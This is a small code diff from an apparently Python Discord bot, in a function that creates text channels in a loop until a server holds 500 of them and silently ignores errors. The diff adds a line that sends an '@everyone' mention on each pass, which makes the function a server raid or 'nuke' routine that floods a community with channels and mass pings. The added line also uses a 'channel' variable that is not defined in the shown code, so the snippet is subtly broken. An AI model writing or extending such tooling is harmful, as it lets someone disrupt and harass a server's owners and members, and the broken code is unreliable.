@@ -79,6 +79,7 @@ async def create_text_channels(guild, name):
     created = 0
     for _ in range(500 - len(guild.channels)):
         try:
+            await channel.send("@everyone")
             await guild.create_text_channel(name=name)
             created += 1
         except:
